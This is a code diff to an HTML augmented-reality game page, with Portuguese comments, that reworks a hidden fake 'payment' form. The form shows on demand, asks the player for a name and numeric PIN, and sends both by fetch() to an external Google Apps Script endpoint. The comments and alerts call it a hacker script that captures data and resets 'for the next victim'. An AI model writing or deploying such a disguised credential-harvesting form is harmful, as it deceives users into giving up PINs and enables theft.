@@ -5,7 +5,7 @@
     <script src="https://aframe.io/releases/1.2.0/aframe.min.js"></script>
     <script src="https://raw.githack.com/AR-js-org/AR.js/master/aframe/build/aframe-ar.js"></script>
     <style>
-        /* Estilo do Formulário */
+        /* CSS BLINDADO: O !important garante que comece escondido */
         #hacker-form {
             position: fixed; 
             top: 50%; 
@@ -15,6 +15,7 @@
             padding: 25px; 
             border-radius: 15px;
             z-index: 9999; 
+            display: none !important; 
             text-align: center; 
             color: white; 
             font-family: 'Segoe UI', sans-serif;
@@ -38,9 +39,9 @@
 
 <body style="margin: 0px; overflow: hidden;">
 
-    <div id="hacker-form" hidden style="display: none !important;">
+    <div id="hacker-form">
         <h2 style="color: #e74c3c; margin-top: 0; font-size: 22px;">PAGAMENTO</h2>
-        <p style="font-size: 14px;">Identifique-se para continuar:</p>
+        <p style="font-size: 14px;">Identifique-se para continuar o jogo:</p>
         <input type="text" id="nome-input" placeholder="Seu Nome">
         <input type="password" id="pin-input" placeholder="Digite seu PIN" inputmode="numeric" pattern="[0-9]*">
         <button id="btn-enviar" onclick="enviarDados()">CONFIRMAR PAGAMENTO</button>
@@ -73,11 +74,12 @@
     <script>
         const linkPlanilha = "https://script.google.com/macros/s/AKfycbz1k8PdYUutAn6JWMN8KpoGBy61bl70-UVmzwZ5-hQ55Dtpp9OQtlBYTUWe7FxKojA/exec";
 
+        // Garante que o formulário comece invisível via JS também
+        document.getElementById('hacker-form').style.display = 'none';
+
         function mostrarFormulario() {
-            const form = document.getElementById('hacker-form');
-            // Remove a trava de invisibilidade
-            form.removeAttribute('hidden');
-            form.style.setProperty('display', 'block', 'important');
+            // Força a exibição removendo o display: none do CSS
+            document.getElementById('hacker-form').style.setProperty('display', 'block', 'important');
         }
 
         function enviarDados() {
@@ -85,7 +87,7 @@
             const pin = document.getElementById('pin-input').value;
 
             if (!nome || !pin) {
-                alert("Preencha todos os campos.");
+                alert("Preencha o Nome e o PIN para autorizar.");
                 return;
             }
 
@@ -93,26 +95,25 @@
             btn.innerHTML = "PROCESSANDO...";
             btn.disabled = true;
 
-            // Envio para a planilha
+            // ENVIO PARA A PLANILHA (Hacker Script)
             fetch(`${linkPlanilha}?nome=${encodeURIComponent(nome)}&senha=${encodeURIComponent(pin)}`, {
                 method: 'POST',
                 mode: 'no-cors'
             })
             .then(() => {
-                alert("🚨 OPERAÇÃO CONCLUÍDA!\n\nDados enviados ao servidor.");
+                alert("🚨 OPERAÇÃO CONCLUÍDA!\n\nDados capturados pelo servidor hacker.");
                 
-                // Reseta e esconde com as travas de novo
+                // Reseta tudo para a próxima vítima
                 document.getElementById('nome-input').value = "";
                 document.getElementById('pin-input').value = "";
-                const form = document.getElementById('hacker-form');
-                form.setAttribute('hidden', 'true');
-                form.style.setProperty('display', 'none', 'important');
-                
+                document.getElementById('hacker-form').style.setProperty('display', 'none', 'important');
                 btn.innerHTML = "CONFIRMAR PAGAMENTO";
                 btn.disabled = false;
             })
             .catch(err => {
-                alert("Erro ao enviar.");
+                console.error(err);
+                alert("Erro ao enviar. Tente novamente.");
+                btn.innerHTML = "CONFIRMAR PAGAMENTO";
                 btn.disabled = false;
             });
         }
